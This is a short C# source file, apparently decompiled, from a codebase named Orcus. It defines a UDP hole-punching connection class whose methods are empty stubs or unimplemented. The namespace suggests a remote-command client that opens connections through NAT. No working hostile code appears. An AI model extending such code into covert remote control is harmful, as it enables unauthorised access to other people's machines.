using System;
using Lidgren.Network;
using Orcus.Plugins;
using Orcus.Shared.Data;

namespace Orcus.Commands.ConnectionInitializer;

public class UdpHolePunchingConnection : IDisposable, IConnection
{
	public NetClient NetClient { get; }

	public bool SupportsStream { get; }

	public UdpHolePunchingConnection(NetClient netClient)
	{
		NetClient = netClient;
	}

	public void Dispose()
	{
	}

	public void SendData(byte[] buffer, int offset, int length)
	{
	}

	public void SendStream(WriterCall writerCall)
	{
		throw new NotImplementedException();
	}
}
